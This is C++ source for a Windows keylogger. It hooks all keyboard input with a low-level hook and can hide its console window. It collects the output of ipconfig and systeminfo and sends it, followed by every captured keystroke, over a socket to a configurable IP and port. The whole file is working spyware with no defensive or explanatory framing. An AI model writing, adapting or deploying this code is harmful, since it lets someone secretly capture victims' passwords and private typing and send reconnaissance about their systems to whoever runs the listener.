#include <iostream>
#include <process.h>
#include <windows.h>
#include "Keys.h"
#include "Telnet.h"

#define IP "127.0.0.1"
#define PORT 5175

#define SHOW_WINDOW TRUE

std::string exec(std::string);
LRESULT __stdcall keyuse(int, WPARAM, LPARAM);
void __cdecl listenForKeys(void);
std::string buffer;
int incomingdata = 0;

int main() {
	if (!SHOW_WINDOW) {
		HWND hconsole = (HWND)GetConsoleWindow();
		ShowWindow(hconsole, FALSE);
	}
	Telnet telnet(IP, PORT, AS_CLIENT);
	client cli = telnet.getSocket();
	telnet.sendData("Network configuration:\n", cli);
	telnet.sendData(exec("ipconfig"), cli); 
	telnet.sendData("\n\n\rSystem configuration:", cli);
	telnet.sendData(exec("systeminfo"), cli);
	telnet.sendData("\nPressed keys:\n", cli);
	HANDLE thread = (HANDLE)_beginthread((void (*)(void *))listenForKeys, 0, 0);
		
	while (1) {
		if (incomingdata == 1) {
			telnet.sendData(buffer, cli);
			incomingdata = 0;
		}
	}
	
	return 0;
}



std::string exec(std::string cmd) {
	std::string out;
	char buffer[4096];
	FILE *f;
	f = _popen(cmd.c_str(), "rt");
	while (fgets(buffer, sizeof(buffer), f)) {
		out += std::string(buffer);
	}
	return out;   
}

void __cdecl listenForKeys(void) {
	HHOOK hook;
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyuse, NULL, 0);
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) != 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	if (hook) {
		UnhookWindowsHookEx(hook);
	}
}

LRESULT __stdcall keyuse(int nCode, WPARAM wParam, LPARAM lParam) {
	Keys ks;
	PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
	if (wParam == WM_KEYDOWN && nCode == HC_ACTION) {
		buffer = ks.processKey((int)key->vkCode);
		incomingdata = 1;
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
